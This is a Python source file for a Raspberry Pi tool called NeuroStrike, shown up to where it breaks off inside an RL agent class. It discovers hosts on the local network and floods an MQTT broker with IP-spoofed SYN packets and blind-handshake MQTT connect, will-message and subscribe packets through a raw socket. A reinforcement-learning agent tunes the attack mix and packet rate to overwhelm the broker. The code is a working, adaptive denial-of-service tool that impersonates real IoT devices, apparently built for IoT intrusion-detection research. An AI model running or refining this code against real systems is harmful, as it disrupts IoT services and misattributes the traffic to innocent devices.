#!/usr/bin/env python3
"""
NeuroStrike - Pi 5 v2 DYNAMIC: Real-Time Attack Generator + RL Agent
===============================================================================
Changes from v2 FINAL:
  - Dynamic network discovery (ARP scan once at startup) replaces hardcoded IPs
  - Auto-detects broker by scanning for port 1883 listeners on local subnet
  - Auto-detects Pi's own IP and interface
  - Spoofable IoT IPs built from discovered devices (excludes broker + self)
  - RTO tracking: RFC 6298 SRTT/RTTVAR/RTO computed every 10 probes
    File 1 (rtt_window.json)  : rolling 10-probe RTT window â€” overwritten each cycle
    File 2 (rto_log.jsonl)    : append-only RTO log for validation analysis
  - HIGH SPEED SENDER: AF_PACKET raw socket replaces Scapy send()
    Scapy send() = ~25 PPS (opens/closes socket per call)
    AF_PACKET persistent socket = 5,000â€“50,000 PPS
    IP and TCP checksums computed manually (kernel does not compute for AF_PACKET)
  - RTO minimum clamp lowered from 200ms to 10ms for LAN accuracy

All previous fixes retained:
  Fix B â€” throughput_ratio in state (soft mitigation signal)
  Fix C â€” mode-stuck guard
  Fix 1 â€” full TCP blind handshake before MQTT payload (now via raw socket)
  Fix 2 â€” TCP probe thread (kernel socket connect from PI_IP)
  Fix 3 â€” capture-accurate TCP parameters (MSS, TTL, windows from discovered devices)
  Fix 4 â€” per-mode reward history on dashboard
  Fix 5 â€” 35 attack modes (5 pure + 30 blended)

State vector   : 35 mode one-hot + 9 numeric features = 44 dims
Action space   : 35 modes Ã— 3 PPS deltas = 105 actions
RL weights     : /home/pi/neurostrike/rl_weights.pkl  (auto-save 60s)
RTO window     : /home/pi/neurostrike/rtt_window.json  (overwritten every 10 probes)
RTO log        : /home/pi/neurostrike/rto_log.jsonl    (append-only)

Run:  sudo python3 neurostrike_pi_v2_dynamic.py
Deps: pip install scapy numpy
"""

import os, sys, time, random, pickle, threading, curses, signal
import itertools, math, collections, json, subprocess
import socket as _socket
import struct
import numpy as np

if os.geteuid() != 0:
    print("âŒ  sudo required"); sys.exit(1)

try:
    from scapy.all import IP, TCP, Raw, ARP, Ether, srp, conf
    conf.verb = 0
except ImportError:
    print("âŒ  pip install scapy"); sys.exit(1)

try:
    import torch
    _o = torch.load
    torch.load = lambda *a, **kw: _o(*a, **{**kw, "map_location": "cpu"})
except ImportError:
    pass

# ============================================================================
# PATHS
# ============================================================================

MODEL_DIR      = "/home/client2/neurostrike_models"
RL_PATH        = "/home/pi/neurostrike/rl_weights.pkl"
RTT_WINDOW_PATH = "/home/pi/neurostrike/rtt_window.json"
RTO_LOG_PATH   = "/home/pi/neurostrike/rto_log.jsonl"

os.makedirs("/home/pi/neurostrike", exist_ok=True)

# ============================================================================
# FIXED PARAMETERS
# ============================================================================

BROKER_PORT       = 1883
MAX_PPS           = 3000   # raw AF_PACKET socket ceiling
MIN_PPS           = 50     # minimum rate â€” below this RL has no meaningful signal
PPS_STEP          = 25    # RL action step size
BLEND_RATIOS      = [0.30, 0.50, 0.70]
FEEDBACK_WINDOW   = 2.0
SAVE_INTERVAL     = 60.0
PROBE_INTERVAL    = 3.0
THROUGHPUT_WINDOW = 5.0
DISCOVER_INTERVAL = 0      # scan once at startup only â€” periodic scan disrupts connections

# TCP parameters for spoofed packets (ESP32-like)
ESP32_MSS     = 1436
ESP32_TTL     = 128
ESP32_WINDOWS = [5760, 5749, 5756, 5660, 4393, 4381, 5747]
EPH_PORT_POOL = list(range(49152, 65535))

# RTO tracking (RFC 6298)
RTT_WINDOW_SIZE   = 10     # compute RTO every 10 probe RTT samples
RTO_MIN_MS        = 10.0   # lowered from RFC 6298 default (200ms) for LAN accuracy
RTO_MAX_MS        = 60000.0
RFC_ALPHA         = 0.125  # SRTT smoothing
RFC_BETA          = 0.25   # RTTVAR smoothing

# RL hyperparameters
GAMMA          = 0.95
LR             = 0.001
EPS_START      = 1.00
EPS_END        = 0.15
EPS_DECAY      = 0.998
REPLAY_CAP     = 1024
BATCH_RL       = 32
HIDDEN         = 128
STUCK_STEPS    = 20
STUCK_REW_THRESH = -2.0

# Rewards
R_ACK         = +10.0
R_ACK_BON     = +2.0
R_RST         = -5.0
R_ICMP        = -3.0
R_TIMEOUT     = -1.0
R_STUCK       = -15.0
R_NO_BROKER   = -20.0

# ============================================================================
# DYNAMIC NETWORK DISCOVERY
# ============================================================================

class NetworkDiscovery:
    """
    Scans the local subnet via ARP once at startup.
    Results are locked in for the session â€” no periodic rescanning
    which would disrupt active TCP connections at high PPS rates.
    Press D on the dashboard (attack OFF) to trigger a manual rescan.
    Maintains:
      - broker_ip   : first host found listening on port 1883
      - pi_ip       : this device's own IP on the active interface
      - iface       : active wireless/ethernet interface
      - iot_ips     : all discovered hosts excluding broker and self
                      (used as spoofable IoT device IPs)
    Falls back gracefully if no broker is found (disables attack).
    """

    def __init__(self):
        self._lock      = threading.Lock()
        self.broker_ip  = None
        self.pi_ip      = None
        self.iface      = None
        self.subnet     = None
        self.iot_ips    = []
        self.all_hosts  = []
        self._ready     = threading.Event()

    def _get_local_ip_iface(self):
        """Get Pi's own IP and active interface."""
        try:
            # Use ip route to find default interface and IP
            result = subprocess.check_output(
                ["ip", "route", "get", "8.8.8.8"],
                stderr=subprocess.DEVNULL
            ).decode()
            # Extract: ... src <IP> dev <IFACE>
            parts = result.split()
            src_idx = parts.index("src") if "src" in parts else -1
            dev_idx = parts.index("dev") if "dev" in parts else -1
            ip    = parts[src_idx + 1] if src_idx >= 0 else None
            iface = parts[dev_idx + 1] if dev_idx >= 0 else "wlan0"
            return ip, iface
        except Exception:
            return None, "wlan0"

    def _get_subnet(self, iface):
        """Get subnet in CIDR notation for the interface."""
        try:
            result = subprocess.check_output(
                ["ip", "-o", "-f", "inet", "addr", "show", iface],
                stderr=subprocess.DEVNULL
            ).decode()
            # Format: ... inet <IP/PREFIX> ...
            for part in result.split():
                if "/" in part and not part.startswith("127"):
                    return part
        except Exception:
            pass
        return None

    def _arp_scan(self, subnet, iface):
        """ARP scan the subnet and return list of active IPs."""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                timeout=2, verbose=False, iface=iface
            )
            return [rcv.psrc for _, rcv in ans]
        except Exception:
            return []

    def _check_mqtt(self, ip):
        """Check if host is listening on port 1883."""
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            s.settimeout(1.0)
            result = s.connect_ex((ip, BROKER_PORT))
            s.close()
            return result == 0
        except Exception:
            return False

    def _scan(self):
        pi_ip, iface = self._get_local_ip_iface()
        if not pi_ip:
            return

        subnet = self._get_subnet(iface)
        if not subnet:
            return

        hosts = self._arp_scan(subnet, iface)

        broker = "192.168.0.134"

        iot = [h for h in hosts if h != pi_ip and h != broker and not h.endswith(".1")]

        with self._lock:
            self.pi_ip     = pi_ip
            self.iface     = iface
            self.subnet    = subnet
            self.broker_ip = broker
            self.iot_ips   = iot
            self.all_hosts = hosts

        if not self._ready.is_set():
            self._ready.set()

    def start(self):
        def _loop():
            # Scan once at startup
            try:
                self._scan()
            except Exception as e:
                print(f"  [Discovery] initial scan error: {e}")
            self._ready.set()
            # After initial scan, idle forever.
            # Call disc._scan() manually (e.g. from dashboard key 'D')
            # to rescan without disrupting ongoing attack traffic.
            while True:
                time.sleep(3600)
        threading.Thread(target=_loop, daemon=True).start()

    def wait_ready(self, timeout=30):
        return self._ready.wait(timeout)

    def status(self):
        with self._lock:
            return {
                "broker":  self.broker_ip,
                "pi":      self.pi_ip,
                "iface":   self.iface,
                "iot_ips": list(self.iot_ips),
                "hosts":   list(self.all_hosts),
            }

    def get_spoof_ip(self):
        """Return a random IoT IP to spoof, or fallback."""
        with self._lock:
            if self.iot_ips:
                return random.choice(self.iot_ips)
            # No IoT devices found â€” spoof a plausible IP on the same subnet
            if self.pi_ip:
                parts = self.pi_ip.rsplit(".", 1)
                fake  = random.randint(100, 200)
                return f"{parts[0]}.{fake}"
            return "192.168.1.100"  # last resort


# Global discovery instance
disc = NetworkDiscovery()

# ============================================================================
# MQTT TOPICS (generic smart-city set)
# ============================================================================

ALL_TOPICS = [
    "hazards/flame", "hazards/flood", "hazards/motion",
    "traffic/speed", "traffic/count", "traffic/occupancy",
    "environment/temperature", "environment/humidity", "environment/light",
    "device/status", "device/heartbeat", "sensor/data",
]

# ============================================================================
# ATTACK PROFILES
# ============================================================================

BASE_PROFILES = {
    "SYN_TCP_Flooding": {
        "label":"SYN FLOOD","model_key":"SYN_TCP_Flooding","short":"SYN",
        "flag_syn":1,"flag_ack":0,"flag_fin":0,"flag_rst":0,"flag_psh":0,"flag_urg":0,
        "port_direction":1,"payload_len":0,"packet_len":62,
        "delta_time":0.001,"delta_time_std":0.0005,
        "window_choices":ESP32_WINDOWS,"send_handshake":False,
    },
    "Basic_Connect_Flooding": {
        "label":"BASIC CONNECT FLOOD","model_key":"Basic_Connect_Flooding","short":"Basic",
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":14,"packet_len":81,
        "delta_time":0.002,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,"send_handshake":True,
    },
    "Delayed_Connect_Flooding": {
        "label":"DELAYED CONNECT FLOOD","model_key":"Delayed_Connect_Flooding","short":"Delayed",
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":14,"packet_len":81,
        "delta_time":0.05,"delta_time_std":0.02,
        "window_choices":ESP32_WINDOWS,"send_handshake":True,
    },
    "Invalid_Subscription_Flooding": {
        "label":"INVALID SUBSCRIBE FLOOD","model_key":"Invalid_Subscription_Flooding","short":"Invalid",
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":10,"packet_len":74,
        "delta_time":0.003,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,"send_handshake":True,
    },
    "Connect_Flooding_with_WILL_payload": {
        "label":"WILL PAYLOAD FLOOD","model_key":"Connect_Flooding_with_WILL_payload","short":"WILL",
        "flag_syn":0,"flag_ack":1,"flag_fin":0,"flag_rst":0,"flag_psh":1,"flag_urg":0,
        "port_direction":1,"payload_len":80,"packet_len":134,
        "delta_time":0.002,"delta_time_std":0.001,
        "window_choices":ESP32_WINDOWS,"send_handshake":True,
    },
}

PURE_NAMES  = list(BASE_PROFILES.keys())
BLEND_PAIRS = list(itertools.combinations(PURE_NAMES, 2))

def _build_modes():
    m = []
    for n in PURE_NAMES:
        m.append({"type":"pure","name":n,"label":BASE_PROFILES[n]["label"],
                  "short":BASE_PROFILES[n]["short"],"base_a":n,"base_b":None,"alpha":1.0})
    for a, b in BLEND_PAIRS:
        for alpha in BLEND_RATIOS:
            sa = BASE_PROFILES[a]["short"]; sb = BASE_PROFILES[b]["short"]
            m.append({"type":"blend",
                      "name":f"{sa}_x_{sb}_{int(alpha*100)}_{int((1-alpha)*100)}",
                      "label":f"{sa}Ã—{sb} {int(alpha*100)}/{int((1-alpha)*100)}",
                      "short":f"{sa}Ã—{sb}","base_a":a,"base_b":b,"alpha":alpha})
    return m

ALL_MODES  = _build_modes()
N_MODES    = len(ALL_MODES)    # 35
N_PPS_ACT  = 3
N_ACTIONS  = N_MODES * N_PPS_ACT  # 105
STATE_DIM  = N_MODES + 9

# ============================================================================
# RTO TRACKER â€” RFC 6298
# ============================================================================

class RTOTracker:
    """
    Computes RTO from TCP probe RTT measurements using RFC 6298.
    Records RTT on both successful and failed probes. Failed probes
    return the connection timeout duration which is a meaningful stress
    signal â€” as the broker becomes overwhelmed, failed connect() calls
    take longer, driving SRTT and RTO upward even when success rate drops.

    Every RTT_WINDOW_SIZE probes:
      1. Updates SRTT and RTTVAR using RFC 6298 smoothing formulas
      2. Computes RTO = SRTT + 4 * RTTVAR, clamped to [RTO_MIN, RTO_MAX]
      3. Overwrites rtt_window.json with the 10 raw RTT samples
      4. Appends one record to rto_log.jsonl for validation

    rtt_window.json  (overwritten, ~10 entries):
      {"timestamp": ..., "rtt_samples_ms": [...], "srtt_ms": ...,
       "rttvar_ms": ..., "rto_ms": ...}

    rto_log.jsonl  (append-only, one JSON line per window):
      {"ts": ..., "srtt_ms": ..., "rttvar_ms": ..., "rto_ms": ...,
       "n_probes": ..., "broker_ip": ...}
    """

    def __init__(self, pps_getter = None):
        self._lock    = threading.Lock()
        self._samples = []      # raw RTT samples in current window (ms)
        self._srtt    = None    # smoothed RTT (ms)
        self._rttvar  = None    # RTT variance (ms)
        self.rto_ms   = RTO_MIN_MS
        self.n_probes = 0
        self._pps_getter = pps_getter
        
    def _get_log_pps(self):
        if self._pps_getter is None:
            return None
        try:
            return float(self._pps_getter())
        except Exception:
            return None

    def record(self, rtt_ms: float, broker_ip: str):
        """Call this after each successful probe with the measured RTT in ms."""
        if rtt_ms <= 0:
            return

        with self._lock:
            self._samples.append(rtt_ms)
            self.n_probes += 1

            if len(self._samples) >= RTT_WINDOW_SIZE:
                self._compute_rto(broker_ip)
                self._samples = []   # reset window

    def _compute_rto(self, broker_ip: str):
        """RFC 6298 SRTT/RTTVAR/RTO update over the current window."""
        for rtt in self._samples:
            if self._srtt is None:
                # First measurement: initialize
                self._srtt   = rtt
                self._rttvar = rtt / 2.0
            else:
                self._rttvar = (1 - RFC_BETA)  * self._rttvar + \
                               RFC_BETA  * abs(self._srtt - rtt)
                self._srtt   = (1 - RFC_ALPHA) * self._srtt   + \
                               RFC_ALPHA * rtt

        rto = self._srtt + 4.0 * self._rttvar
        rto = float(np.clip(rto, RTO_MIN_MS, RTO_MAX_MS))
        self.rto_ms = rto

        ts  = time.time()
        record = {
            "timestamp":      ts,
            "rtt_samples_ms": list(self._samples),
            "srtt_ms":        round(self._srtt,   4),
            "rttvar_ms":      round(self._rttvar, 4),
            "rto_ms":         round(rto,           4),
        }

        # File 1: overwrite rolling window
        try:
            with open(RTT_WINDOW_PATH, "w") as f:
                json.dump(record, f, indent=2)
        except Exception:
            pass

        # File 2: append to RTO log
        log_entry = {
            "ts":         ts,
            "srtt_ms":    round(self._srtt,   4),
            "rttvar_ms":  round(self._rttvar, 4),
            "rto_ms":     round(rto,           4),
            "n_probes":   self.n_probes,
            "broker_ip":  broker_ip or "unknown",
            "log_pps":  self._get_log_pps(),
        }
        try:
            with open(RTO_LOG_PATH, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
        except Exception:
            pass

    def current(self):
        with self._lock:
            return {
                "rto_ms":    round(self.rto_ms, 2),
                "srtt_ms":   round(self._srtt or 0, 2),
                "rttvar_ms": round(self._rttvar or 0, 2),
                "n_probes":  self.n_probes,
            }


# ============================================================================
# MQTT PAYLOADS
# ============================================================================

def _varlen(n):
    out = []
    while True:
        b = n & 0x7F; n >>= 7; out.append(b | (0x80 if n else 0))
        if not n: break
    return bytes(out)

def _mqtt_connect(with_will=False):
    cid   = f"ns_{random.randint(0, 0xFFFF):04x}".encode()
    flags = 0b11001110 if with_will else 0b00000010
    var   = bytes([0x00, 0x04]) + b"MQTT" + bytes([0x04, flags, 0x00, 0x3c])
    pay   = bytes([0x00, len(cid)]) + cid
    if with_will:
        wt  = random.choice(ALL_TOPICS).encode()
        wm  = f"ALERT_{random.randint(0,999)}".encode()
        pay += bytes([0x00, len(wt)]) + wt + bytes([0x00, len(wm)]) + wm
    rem = var + pay
    return bytes([0x10]) + _varlen(len(rem)) + rem

def _mqtt_subscribe():
    topic = random.choice(["#", "+/+", "sensor/+", "status/#", "invalid/##",
                            random.choice(ALL_TOPICS)])
    pid   = random.randint(1, 0xFFFF); t = topic.encode()
    pay   = bytes([pid >> 8, pid & 0xFF, 0x00, len(t)]) + t + bytes([0x00])
    return bytes([0x82]) + _varlen(len(pay)) + pay

PAYLOAD_FN = {
    "SYN_TCP_Flooding":                   lambda: b"",
    "Basic_Connect_Flooding":             lambda: _mqtt_connect(False),
    "Delayed_Connect_Flooding":           lambda: _mqtt_connect(False),
    "Invalid_Subscription_Flooding":      _mqtt_subscribe,
    "Connect_Flooding_with_WILL_payload": lambda: _mqtt_connect(True),
}

# ============================================================================
# BROKER PROBE â€” kernel socket connect() from Pi's real IP
# ============================================================================

class BrokerProbe:
    """
    Performs a real TCP connect() from the Pi's actual IP to the broker
    every PROBE_INTERVAL seconds. This is the RL feedback channel since
    spoofed attack packets mean the Pi never receives broker ACKs/RSTs.

    Also feeds RTT measurements to RTOTracker.
    """
    INTERVAL = PROBE_INTERVAL
    TIMEOUT  = 0.5   # lowered from 2.0 â€” faster failure detection, more RTO samples

    def __init__(self, rto_tracker: RTOTracker):
        self._l          = threading.Lock()
        self._rto        = rto_tracker
        self.reachable   = True
        self.connect_ok  = True
        self.connect_ms  = 0.0
        self.probe_count = 0
        self.ok_count    = 0

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self):
        while True:
            broker = disc.broker_ip
            if not broker:
                time.sleep(self.INTERVAL)
                continue

            t0 = time.time(); ok = False; ms = 0.0
            try:
                sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                sock.settimeout(self.TIMEOUT)
                sock.connect((broker, BROKER_PORT))
                ms = (time.time() - t0) * 1000
                ok = True
                sock.close()
            except Exception:
                ms = (time.time() - t0) * 1000

            with self._l:
                self.reachable   = ok
                self.connect_ok  = ok
                self.connect_ms  = ms
                self.probe_count += 1
                if ok:
                    self.ok_count += 1
                # Record RTT regardless of success or failure.
                # Failed connects return the timeout duration which is a
                # meaningful stress signal â€” broker taking 2000ms to reject
                # is captured as RTO increase just like a slow successful connect.
                self._rto.record(ms, broker)

            time.sleep(self.INTERVAL)

    def full_status(self):
        with self._l:
            return {
                "ok":           self.connect_ok,
                "ms":           self.connect_ms,
                "probes":       self.probe_count,
                "ok_count":     self.ok_count,
                "success_rate": self.ok_count / max(self.probe_count, 1),
            }

# ============================================================================
# PROBE-BASED FEEDBACK (maps probe result to RL signal format)
# ============================================================================

class ProbeBasedFeedback:
    def __init__(self, probe: BrokerProbe):
        self._probe  = probe
        self._last_t = time.time()

    def snap(self) -> dict:
        now  = time.time()
        win  = now - self._last_t
        self._last_t = now
        ps   = self._probe.full_status()
        acks = 1 if ps["ok"] else 0
        rsts = 0 if ps["ok"] else 1
        return {
            "acks":         acks,
            "rsts":         rsts,
            "icmps":        0,
            "avg_rtt":      ps["ms"] / 1000.0,
            "window":       win,
            "success_rate": ps["success_rate"],
            "connect_ms":   ps["ms"],
        }

    def start(self):
        pass

# ============================================================================
# CTGAN MODEL CACHE + SAMPLE BUFFER
# ============================================================================

class ModelCache:
    def __init__(self, d):
        self.d = d; self._m = {}; self._f = set()
    def get(self, name):
        k = BASE_PROFILES[name]["model_key"]
        if k in self._f: return None
        if k not in self._m:
            p = os.path.join(self.d, f"ctgan_model_{k}.pkl")
            if os.path.exists(p):
                try:
                    with open(p, "rb") as f: self._m[k] = pickle.load(f)
                except Exception: self._f.add(k)
            else: self._f.add(k)
        return self._m.get(k)
    def loaded(self): return len(self._m)
    def status(self, name):
        k = BASE_PROFILES[name]["model_key"]
        return "CTGAN" if k in self._m else ("FAIL" if k in self._f else "LOAD")

class SampleBuffer:
    BUF = 500
    def __init__(self):
        self._b = {n: [] for n in PURE_NAMES}; self._l = threading.Lock()
    def get(self, name, mc):
        with self._l:
            if self._b[name]: return self._b[name].pop()
        return None
    def refill(self, name, mc):
        m = mc.get(name)
        if not m: return
        try:
            rows = m.sample(self.BUF).to_dict("records")
            with self._l: self._b[name].extend(rows)
        except Exception: pass
    def start(self, mc):
        def _w():
            while True:
                for n in PURE_NAMES:
                    with self._l: low = len(self._b[n]) < self.BUF // 2
                    if low: self.refill(n, mc)
                time.sleep(0.1)
        threading.Thread(target=_w, daemon=True).start()

# ============================================================================
# RAW SOCKET SENDER
# ============================================================================
# Uses AF_PACKET raw sockets directly instead of Scapy's send().
# Scapy send() opens/closes a raw socket per call â†’ ~25 PPS on Pi 5.
# AF_PACKET with a persistent socket â†’ 5,000â€“50,000 PPS on Pi 5.
#
# Packet layout built manually using struct:
#   Ethernet header (14 bytes) + IP header (20 bytes) + TCP header (20 bytes)
#   + optional MSS option (4 bytes in SYN) + payload
#
# IP and TCP checksums computed manually (kernel does NOT compute them for
# AF_PACKET raw sockets â€” unlike IPPROTO_RAW which fakes the IP header).
# ============================================================================

def _checksum(data: bytes) -> int:
    """RFC 1071 one's complement checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def _ip_hdr(src_ip: str, dst_ip: str, proto: int, payload_len: int,
            ttl: int = 64) -> bytes:
    """Build IP header (20 bytes, no options)."""
    total = 20 + payload_len
    hdr = struct.pack('!BBHHHBBH4s4s',
        0x45,           # version=4, IHL=5
        0,              # DSCP/ECN
        total,          # total length
        random.randint(1, 65535),  # ID
        0x40 << 8,      # flags=DF, frag offset=0  (0x4000)
        ttl,
        proto,          # 6=TCP
        0,              # checksum placeholder
        _socket.inet_aton(src_ip),
        _socket.inet_aton(dst_ip),
    )
    # Fix flags+frag: struct packs them separately, rebuild correctly
    hdr = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, total,
        random.randint(1, 65535),
        0x4000,         # DF flag set, no fragment
        ttl, proto, 0,
        _socket.inet_aton(src_ip),
        _socket.inet_aton(dst_ip),
    )
    cksum = _checksum(hdr)
    return hdr[:10] + struct.pack('!H', cksum) + hdr[12:]

_MSS_OPT = struct.pack('!BBH', 2, 4, ESP32_MSS)

F_FIN = 0X01
F_SYN = 0X02
F_RST = 0X04
F_PSH = 0X08
F_ACK = 0X10
F_URG = 0X20

F_PSHACK = F_PSH | F_ACK
F_SYNACK = F_SYN | F_ACK

def _tcp_hdr(src_ip: str, dst_ip: str,
             sport: int, dport: int,
             seq: int, ack_seq: int,
             flags: int, window: int,
             payload: bytes,
             options: bytes = b'') -> bytes:
    """Build TCP header with optional TCP options and payload."""

    if len(options) % 4:
        options += b'\x01' * (4 - (len(options) % 4))

    tcp_header_len = 20 + len(options)
    data_off = (tcp_header_len // 4) << 4

    pseudo = struct.pack(
        '!4s4sBBH',
        _socket.inet_aton(src_ip),
        _socket.inet_aton(dst_ip),
        0,
        6,
        tcp_header_len + len(payload),
    )

    tcp_raw = struct.pack(
        '!HHIIBBHHH',
        sport, dport, seq, ack_seq,
        data_off, flags, window, 0, 0
    ) + options + payload

    cksum = _checksum(pseudo + tcp_raw)
    return tcp_raw[:16] + struct.pack('!H', cksum) + tcp_raw[18:]

def _get_raw_sock(iface: str):
    global _raw_sock
    if _raw_sock is None:
        s = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW)
        s.bind((iface, 0))
        _raw_sock = s
    return _raw_sock


def _build_frame(src_mac: bytes, dst_mac: bytes,
                 src_ip: str, dst_ip: str,
                 sport: int, dport: int,
                 seq: int, ack_seq: int,
                 tcp_flags: int, window: int,
                 payload: bytes,
                 tcp_options: bytes = b'',
                 ttl: int = ESP32_TTL) -> bytes:
    """Build complete Ethernet frame ready for AF_PACKET send."""
    tcp  = _tcp_hdr(src_ip, dst_ip, sport, dport, seq, ack_seq,
                    tcp_flags, window, payload, tcp_options)
    ip   = _ip_hdr(src_ip, dst_ip, 6, len(tcp), ttl)
    eth  = dst_mac + src_mac + b'\x08\x00'   # EtherType IPv4
    return eth + ip + tcp


def _resolve_mac(iface: str) -> bytes:
    """Get Pi's own MAC address for the given interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            mac_str = f.read().strip()
        return bytes(int(x, 16) for x in mac_str.split(':'))
    except Exception:
        return b'\x02\x00\x00\x00\x00\x01'   # fallback


def _arp_mac(ip: str, iface: str, src_mac: bytes) -> bytes:
    """Resolve IP to MAC via ARP. Returns broadcast if unresolvable."""
    try:
        ans, _ = srp(
            Ether(src=src_mac.hex(':')) / ARP(pdst=ip),
            timeout=1, verbose=False, iface=iface
        )
        if ans:
            return bytes(int(x, 16) for x in ans[0][1].hwsrc.split(':'))
    except Exception:
        pass
    return b'\xff\xff\xff\xff\xff\xff'   # broadcast fallback


# MAC cache so we don't ARP every packet
_mac_cache   = {}
_pi_mac      = None
_broker_mac  = None

_raw_sock = None
_raw_lock = threading.Lock()

def _init_macs(iface: str, broker_ip: str):
    global _pi_mac, _broker_mac
    _pi_mac     = _resolve_mac(iface)
    _broker_mac = _arp_mac(broker_ip, iface, _pi_mac)
    print(f"_pi_mac= {_pi_mac.hex(':') if _pi_mac else None}")
    print(f"_broker_mac= {_broker_mac.hex(':') if _broker_mac else None}")


# â”€â”€ Ephemeral port counter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_eph_counters = {}

def _next_port(ip: str) -> int:
    if ip not in _eph_counters:
        _eph_counters[ip] = random.randint(0, len(EPH_PORT_POOL) - 1)
    _eph_counters[ip] = (_eph_counters[ip] + 1) % len(EPH_PORT_POOL)
    return EPH_PORT_POOL[_eph_counters[ip]]


def _stat(name: str) -> dict:
    p = BASE_PROFILES[name]
    return {
        "delta_time":     max(0, random.gauss(p["delta_time"], p["delta_time_std"])),
        "packet_len":     p["packet_len"],
        "flag_syn":       p["flag_syn"],  "flag_ack": p["flag_ack"],
        "flag_fin":       p["flag_fin"],  "flag_rst": p["flag_rst"],
        "flag_psh":       p["flag_psh"],  "flag_urg": p["flag_urg"],
        "port_direction": p["port_direction"],
        "payload_len":    p["payload_len"],
        "tcp_window_size":random.choice(p["window_choices"]),
    }

def _get_row(mode, mc, sb):
    if mode["type"] == "pure":
        n = mode["base_a"]; r = sb.get(n, mc); return (r or _stat(n)), n
    src = mode["base_a"] if random.random() < mode["alpha"] else mode["base_b"]
    r   = sb.get(src, mc); return (r or _stat(src)), src


def send_packet(row, attack_name: str, iface: str):
    """
    High-speed spoofed packet send via persistent AF_PACKET raw socket.
    Bypasses Scapy's per-call socket overhead â€” achieves 5k-50k PPS vs 25 PPS.
    """
    global _pi_mac, _broker_mac

    broker = disc.broker_ip
    if not broker:
        return 0, 0

    # Initialise MACs on first call or if broker changed
    if _pi_mac is None or _broker_mac is None:
        _init_macs(iface, broker)

    src_ip   = disc.get_spoof_ip()
    src_port = _next_port(src_ip)
    p        = BASE_PROFILES[attack_name]
    win      = int(max(512, min(
                   float(row.get("tcp_window_size",
                         random.choice(p["window_choices"]))), 65535)))

    try:
        sock = _get_raw_sock(iface)

        # â”€â”€ SYN TCP Flooding â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if attack_name == "SYN_TCP_Flooding":
            isn   = random.randint(1_000_000, 3_000_000_000)
            frame = _build_frame(
                _pi_mac, _broker_mac,
                src_ip, broker,
                src_port, BROKER_PORT,
                isn, 0,
                F_SYN, win,
                b'',
                _MSS_OPT,
            )
            with _raw_lock:
                sock.send(frame)
            return len(frame), 1

        # â”€â”€ Delayed Connect â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if attack_name == "Delayed_Connect_Flooding":
            dt = max(0, random.gauss(p["delta_time"], p["delta_time_std"]))
            if dt > 0:
                time.sleep(min(dt, 5.0))

        # â”€â”€ All other MQTT attacks (blind 3-packet handshake) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        mqtt  = PAYLOAD_FN[attack_name]()
        isn   = random.randint(1_000_000, 3_000_000_000)
        cli   = isn + 1

        syn_frame = _build_frame(
            _pi_mac, _broker_mac,
            src_ip, broker,
            src_port, BROKER_PORT,
            isn, 0, F_SYN, win, b'', _MSS_OPT,
        )
        ack_frame = _build_frame(
            _pi_mac, _broker_mac,
            src_ip, broker,
            src_port, BROKER_PORT,
            cli, 1, F_ACK, win, b'',
        )
        data_frame = _build_frame(
            _pi_mac, _broker_mac,
            src_ip, broker,
            src_port, BROKER_PORT,
            cli, 1, F_PSHACK, win, mqtt,
        )

        with _raw_lock:
            sock.send(syn_frame)
            sock.send(ack_frame)
            sock.send(data_frame)

        return len(syn_frame) + len(ack_frame) + len(data_frame), 3

    except Exception as e:
        # If raw socket breaks, reset it so it reinitialises next call
        global _raw_sock
        _raw_sock = None
        print(f"send packet error attack = {attack_name} iface={iface} broker={broker} err={repr(e)}")
        return 0, 0

# ============================================================================
# RL AGENT
# ============================================================================

class QNet:
    def __init__(self, si, h, oa):
        s = 0.05
        self.W1 = np.random.randn(si, h).astype(np.float32) * s
        self.b1 = np.zeros(h,  dtype=np.float32)
        self.W2 = np.random.randn(h, h).astype(np.float32) * s
        self.b2 = np.zeros(h,  dtype=np.float32)
        self.W3 = np.random.randn(h, oa).astype(np.float32) * s
        self.b3 = np.zeros(oa, dtype=np.float32)

    def fwd(self, x):
        h1 = np.maximum(0, x  @ self.W1 + self.b1)
        h2 = np.maximum(0, h1 @ self.W2 + self.b2)
        return h2 @ self.W3 + self.b3

    def to_d(self): return {k: v.copy() for k, v in self.__dict__.items()}
    def fr_d(self, d):
        for k, v in d.items(): setattr(self, k, v.copy())


class RLAgent:
    def __init__(self):
